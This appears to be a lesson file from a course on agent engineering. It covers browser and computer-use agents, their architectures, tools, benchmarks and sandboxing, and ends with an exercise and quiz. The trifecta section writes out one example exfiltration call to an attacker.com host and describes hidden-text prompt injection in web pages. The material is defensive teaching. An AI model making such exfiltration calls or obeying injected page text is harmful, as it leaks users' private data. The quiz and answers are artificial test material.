@@ -1,0 +1,256 @@
+---
+title: "Computer Use & Browser Agents"
+description: "The hottest production surface of the 2025-2026 wave — and the canonical Lethal Trifecta in the wild. Screenshot-driven vs DOM-driven approaches, the tool landscape (Computer Use, Skyvern, Browser Use, Stagehand, Browserbase, MolmoWeb), benchmark state, and the sandboxing that keeps them survivable."
+phase: 6
+module: "6-7-agent-engineering"
+order: 5
+estimatedMinutes: 13
+difficulty: "advanced"
+standards:
+  cs2023: ["AI-2", "HCI-2", "SEC-1"]
+  swebok: ["Software Design"]
+  bloom: "apply"
+  sfia: 5
+  dreyfus: "proficient"
+vocabulary:
+  - llm
+  - agent
+---
+
+## Why this matters
+
+Browser-using and OS-using agents are the most consequential production surface of the 2025-2026 agentic wave. They're also the perfect concrete instance of the [Lethal Trifecta](./04-prompt-injection-agentic.mdx) you just learned about:
+
+- **Untrusted tokens** — every web page they read.
+- **Private data** — every authenticated session they hold.
+- **Exfiltration vector** — they can navigate, click, and POST anywhere.
+
+This lesson covers the two architectural approaches, the tool landscape as of mid-2026, where the benchmarks actually sit, and the sandboxing patterns that keep these agents survivable in production.
+
+## Two architectural approaches
+
+### Screenshot-driven (vision-LLM)
+
+The agent takes a screenshot, asks a vision-capable LLM "where do I click? what do I type?", emits OS-level mouse/keyboard events, takes another screenshot, repeats. The model interprets pixels, not DOM.
+
+```
+[screenshot] → vision LLM → "click(540, 312)" → OS event → [next screenshot] → ...
+```
+
+**Strengths:** works on any UI the human eye can read — native desktop apps, Flash relics, Canvas-rendered apps, OS-level dialogs. Resists DOM changes that don't affect the visual layout.
+
+**Weaknesses:** higher latency per step (screenshot transit + vision inference), harder to debug, brittle on visually noisy or animated UIs.
+
+This is Anthropic's Computer Use, and the underlying approach in Skyvern's vision mode.
+
+### DOM-driven (text-LLM + selectors)
+
+The agent inspects the DOM tree, asks a text LLM "given this DOM, what's the next selector to act on?", emits Playwright/Selenium commands, gets the next DOM, repeats. No screenshots required.
+
+```
+[DOM tree] → text LLM → "click on `#submit-btn`" → Playwright → [next DOM] → ...
+```
+
+**Strengths:** faster (DOM is smaller than screenshots), cheaper (text LLM tokens), easier to debug (selectors are inspectable), more reliable on standard web UIs.
+
+**Weaknesses:** breaks on Canvas-rendered apps (Google Docs, Figma), useless for native desktop apps, fragile when sites obfuscate or shadow-DOM their UI.
+
+This is Browser Use, Stagehand, and most general-purpose browser agents.
+
+**Hybrid approach:** the strongest 2026 frameworks (Skyvern, Browser Use's newer builds) use vision _plus_ DOM — DOM for fast paths, vision as the fallback when selectors fail.
+
+## The tool landscape (mid-2026)
+
+| Tool                       | Type          | Stack                              | Distinctive trait                                                                  |
+| -------------------------- | ------------- | ---------------------------------- | ---------------------------------------------------------------------------------- |
+| **Anthropic Computer Use** | API feature   | Closed (Claude Opus / Sonnet 4.x+) | OS-level mouse/keyboard via screenshot interpretation                              |
+| **Skyvern**                | OSS framework | Playwright + Vision-LLM (hybrid)   | Resists selector breakage when UI is unchanged but DOM mutates. 20k+ GitHub stars. |
+| **Browser Use**            | OSS framework | Python, Playwright (DOM-first)     | Largest community (78k+ stars), Python-first                                       |
+| **Stagehand**              | OSS framework | TypeScript, Playwright             | TypeScript counterpart to Browser Use; same DOM-first approach                     |
+| **Browserbase**            | Managed BaaS  | Headless Chrome cloud              | Browser-as-a-service for scaling agent browser fleets                              |
+| **MolmoWeb (AI2)**         | OSS model     | 8-9B open model                    | 91.8% on ScreenSpot v2 — beats Claude and OpenAI Computer Use on raw grounding     |
+
+If you're choosing in mid-2026:
+
+- **Best ergonomics + closed-source acceptable** → Anthropic Computer Use.
+- **OSS + Python team** → Browser Use.
+- **OSS + TypeScript team** → Stagehand.
+- **OSS + want hybrid vision/DOM** → Skyvern.
+- **Need to scale browser fleets** → Browserbase as your browser provider; pick any framework above as the client.
+- **Need open model weights** → MolmoWeb for grounding, paired with a stronger LLM for planning.
+
+## Benchmark state (mid-2026)
+
+Benchmarks drift weekly. The current cluster as of the research date:
+
+- **OSWorld** (full-OS tasks) — Anthropic Computer Use leads at **~72.5%**, up dramatically from <15% in 2024. The jump is mostly attributed to better vision-grounding training.
+- **WebArena** (browser-only tasks) — Claude Mythos Preview at **~68.7%** leads.
+- **VisualWebArena** (vision-heavy browser tasks) — MolmoWeb (open, 8-9B) at ~50% vs GPT-4o 33.1% and Claude Sonnet 4 32.8%. **The strongest open browser-vision model in the field.**
+- **ScreenSpot v2** (grounding-only — can the model locate the right pixel?) — MolmoWeb at 91.8% leads.
+
+Treat benchmark percentages as a snapshot. By the time you read this lesson, the leaders may have changed. The pattern that matters: **closed frontier models lead on planning, open models are catching up on grounding.**
+
+## The Lethal Trifecta, with concrete browser examples
+
+Browser agents complete the trifecta by default:
+
+1. **Untrusted tokens** — _every web page is attacker-influenceable._ Hidden text, white-on-white instructions, zero-width characters, malicious meta tags, indirect-injection payloads in search results.
+2. **Private data** — _the agent has the user's authenticated cookies._ It can read your Gmail, your bank, your SaaS dashboards, your private GitHub.
+3. **Exfiltration vector** — _the agent can navigate anywhere and submit any form._ `agent.goto("https://attacker.com/?stolen=" + secret)` is a valid action the agent might take if hijacked.
+
+This is why the [previous lesson's framing](./04-prompt-injection-agentic.mdx) matters: browser agents are not a "be careful about prompt injection" surface. They are _the_ prompt-injection surface. Designs that treat them as ordinary tooling will get owned.
+
+## Sandboxing approaches
+
+### 1. VM or container per session (Anthropic reference)
+
+Each agent session runs in a dedicated container/VM with a fresh browser. The container has no host-filesystem access, no SSH keys, no real credentials beyond what's explicitly provided. Compromise destroys only that container.
+
+```
+[user session] → spawn container → ephemeral browser → agent operates → tear down at end
+```
+
+This is the heaviest setup but the strongest isolation. Anthropic's Computer Use reference implementation works this way.
+
+### 2. Ephemeral browser profile per task (Browserbase pattern)
+
+A managed browser-fleet vendor spins up a fresh profile (no cookies, no extensions, no history) per agent task. The agent gets only the credentials the task explicitly provided. When the task ends, the profile is destroyed.
+
+This is cheaper than per-session VMs and works well when the agent doesn't need long-lived authenticated sessions. Browserbase, Browserless, and similar vendors build their business on this.
+
+### 3. Tool whitelisting at the network layer
+
+Even inside a sandbox, restrict where the agent can go. Domain allowlist at the egress proxy. Block cloud-metadata IPs (169.254.169.254), private ranges. Egress payload filter for known secret patterns. Same controls as MCP lesson 07.
+
+### 4. Dual-LLM pattern for web content
+
+Apply the [dual-LLM pattern](./04-prompt-injection-agentic.mdx) — the privileged LLM never reads raw web text; a quarantined vision LLM (or text LLM) extracts structured information and the privileged LLM operates on those symbolic references. Microsoft built this into their 2026 mitigations after CVE-2025-32711.
+
+### 5. Human approval gates on irreversible actions
+
+Form submission, financial transactions, sending messages, navigating to non-allowlisted domains — pause for explicit user approval. The approval UI shows the _actual_ action ("agent wants to POST to https://example.com/transfer with body {...}"), not a summary. This is the Cloudflare Workflows `waitForApproval()` pattern at the browser layer.
+
+## When to reach for Computer Use vs scripted automation
+
+Three questions to ask before adding browser-agent capability to a system:
+
+1. **Is the target site stable enough for a scripted Playwright flow to work?** If yes, scripted automation is faster, cheaper, more reliable, and has _none_ of the Trifecta exposure. Use it.
+2. **Does the task require visual judgment (interpret a chart, click the actual button under that ambiguous label, find the right element on a noisy UI)?** If yes, browser agents earn their cost. If no, scripted is still better.
+3. **Can you afford the worst-case blast radius?** A hijacked browser agent on the user's authenticated session can do anything the user can do. If that's unacceptable, the agent shouldn't have authenticated sessions at all — run it on dummy accounts with sandbox data.
+
+The most successful 2026 production deployments of browser agents share a pattern: **the agent is given a fresh, scoped, low-privilege session** instead of being handed the user's everything-account. The agent has just enough access to do the task and no more.
+
+## Try it
+
+<SandboxExercise
+  language="javascript"
+  instructions="Write recommendBrowserApproach(req) where req is { targetIsStable, needsVisualJudgment, canAffordBlastRadius }. Return 'scripted' (Playwright/Puppeteer, no agent) when targetIsStable is true and needsVisualJudgment is false; 'agent-sandboxed' when needsVisualJudgment is true AND canAffordBlastRadius is true; 'redesign' when needsVisualJudgment is true but canAffordBlastRadius is false (the task is too risky as designed)."
+  initialCode={`function recommendBrowserApproach(req) {
+  // Route to the appropriate automation approach
+}
+
+console.log(recommendBrowserApproach({ targetIsStable: true, needsVisualJudgment: false, canAffordBlastRadius: true }));
+// 'scripted'
+
+console.log(recommendBrowserApproach({ targetIsStable: false, needsVisualJudgment: true, canAffordBlastRadius: true }));
+// 'agent-sandboxed'
+
+console.log(recommendBrowserApproach({ targetIsStable: false, needsVisualJudgment: true, canAffordBlastRadius: false }));
+// 'redesign'`}
+  solution={`function recommendBrowserApproach(req) {
+if (req?.targetIsStable && !req?.needsVisualJudgment) return "scripted";
+if (req?.needsVisualJudgment && !req?.canAffordBlastRadius) return "redesign";
+if (req?.needsVisualJudgment && req?.canAffordBlastRadius) return "agent-sandboxed";
+return "scripted"; // default to lowest blast radius
+}
+
+console.log(recommendBrowserApproach({ targetIsStable: true, needsVisualJudgment: false, canAffordBlastRadius: true }));
+console.log(recommendBrowserApproach({ targetIsStable: false, needsVisualJudgment: true, canAffordBlastRadius: true }));
+console.log(recommendBrowserApproach({ targetIsStable: false, needsVisualJudgment: true, canAffordBlastRadius: false }));`}
+testCases={["routes stable+no-visual to scripted, visual+affordable-blast to agent-sandboxed, visual+unaffordable-blast to redesign"]}
+/>
+
+## Check your understanding
+
+<Quiz
+  questions={[
+    {
+      type: "multiple-choice",
+      question: "Why are browser-using agents the canonical Lethal Trifecta surface?",
+      options: [
+        "Browser agents are slower than text-only agents.",
+        "They combine all three Trifecta corners by default: untrusted tokens (any web page), private data (authenticated sessions), and exfiltration vector (navigate + form-submit anywhere).",
+        "Browsers have more bugs than other software.",
+        "The vision API costs more.",
+      ],
+      correct: 1,
+      explanation:
+        "Browser agents read attacker-influenceable content, hold the user's authenticated cookies, and can navigate anywhere — the three Trifecta corners are present by default. This is why the security framing of the previous lesson applies directly here, not as a precaution but as a structural requirement.",
+    },
+    {
+      type: "multiple-choice",
+      question:
+        "Your team wants to automate downloading PDFs from a payroll provider every Friday. The site's HTML is stable and the same selectors work week-over-week. Best approach?",
+      options: [
+        "Anthropic Computer Use — agents are more future-proof.",
+        "Browser Use — Python is easier.",
+        "Scripted Playwright (no agent). The target is stable and no visual judgment is required; the Trifecta exposure of a browser agent isn't earned by the use case.",
+        "Skyvern with vision-LLM fallback.",
+      ],
+      correct: 2,
+      explanation:
+        "Rule of thumb: if scripted automation works, use it. It's faster, cheaper, more reliable, and has no Lethal Trifecta exposure. Browser agents are for tasks where visual judgment or unpredictable UIs make scripting impractical.",
+    },
+    {
+      type: "multiple-choice",
+      question: "Screenshot-driven vs DOM-driven browser agents differ most fundamentally on:",
+      options: [
+        "Which programming language they support.",
+        "Whether the model interprets pixels (screenshot-driven, works on any UI) or DOM elements (DOM-driven, faster + cheaper but breaks on Canvas-rendered apps and native desktop).",
+        "Whether they support headless mode.",
+        "Pricing model.",
+      ],
+      correct: 1,
+      explanation:
+        "Screenshot-driven works on any UI the eye can read (native apps, Canvas, Flash relics, OS dialogs) but pays vision-inference cost per step. DOM-driven is faster + cheaper + easier to debug but breaks on Canvas-rendered apps (Google Docs, Figma) and useless for native desktop. Strongest 2026 frameworks use hybrid: DOM by default, vision as fallback.",
+    },
+    {
+      type: "multiple-choice",
+      question:
+        "Your browser agent operates on user-authenticated sessions. A prompt-injection payload in a web page could exfiltrate everything the user can see. What's the structural mitigation that actually works?",
+      options: [
+        "Add a system-prompt instruction telling the agent to ignore injection attempts.",
+        "Use a more capable model.",
+        "Run the agent in a sandbox with a fresh, scoped, low-privilege session — give it only the credentials the task needs, never the user's everything-account. Layer dual-LLM if web content must be processed.",
+        "Encrypt the user's cookies in transit.",
+      ],
+      correct: 2,
+      explanation:
+        "System-prompt hardening fails to attacker-crafted inputs. Capable models still get hijacked. The structural fix is reducing what's stealable: scope the agent's credentials to what the task needs, run in an ephemeral profile/sandbox, layer dual-LLM for content processing. The user's everything-account should never be in scope for an agent in 2026.",
+    },
+  ]}
+/>
+
+<FillBlank
+  prompt="Browser agents come in two architectural flavors: ___-driven (vision-LLM on screenshots, works on any UI including Canvas and native apps) and ___-driven (text-LLM on selectors, faster + cheaper, breaks on Canvas-rendered apps). The strongest 2026 frameworks use ___ — DOM by default, vision as fallback. The structural defence against hijack is running each session in a sandboxed ___-privilege scope."
+  answers={["screenshot", "DOM", "hybrid", "low"]}
+  hints={[
+    "Pixel-based approach.",
+    "Element-based approach.",
+    "Combine the two.",
+    "Minimum credentials principle.",
+  ]}
+/>
+
+## What you learned
+
+- **Browser agents are the canonical Lethal Trifecta surface** by default — untrusted tokens, private data, exfiltration vector all present. The security framing from lesson 04 applies structurally, not as a precaution.
+- **Two architectural approaches**: screenshot-driven (vision-LLM, works on any UI) and DOM-driven (text-LLM, faster + cheaper but breaks on Canvas-rendered apps). Strongest 2026 frameworks are hybrid.
+- **Tool landscape (mid-2026)**: Anthropic Computer Use (closed, OS-level), Skyvern (OSS hybrid), Browser Use (OSS Python, 78k stars), Stagehand (OSS TS), Browserbase (managed browser BaaS), MolmoWeb (8-9B open model leading grounding benchmarks).
+- **Benchmarks drift weekly.** Mid-2026 cluster: OSWorld ~72.5% Anthropic, WebArena ~68.7% Claude Mythos, VisualWebArena MolmoWeb ~50% leading the open category, ScreenSpot v2 MolmoWeb 91.8%. Closed frontier models lead planning; open models are catching up on grounding.
+- **When NOT to use a browser agent**: when scripted Playwright works on the target. The Trifecta exposure isn't earned by use cases that don't need visual judgment or UI flexibility.
+- **Sandboxing patterns**: VM/container per session, ephemeral browser profile per task, tool whitelisting at the network layer, dual-LLM for web content, human approval gates on irreversible actions. The 2026 production pattern is **fresh, scoped, low-privilege sessions** — agent gets just enough access to do the task.
+
+Next: [Voice & Realtime Agents](./06-voice-realtime-agents.mdx) — the emerging surface with its own latency and compliance gotchas.
+
+**Canonical references:** [Anthropic Computer Use docs](https://docs.anthropic.com/en/docs/build-with-claude/computer-use) · [Skyvern GitHub](https://github.com/Skyvern-AI/skyvern) · [Browser Use](https://github.com/browser-use/browser-use) · [Stagehand](https://github.com/browserbase/stagehand) · [Browserbase](https://www.browserbase.com) · [WebArena](https://webarena.dev) · [OSWorld](https://os-world.github.io).
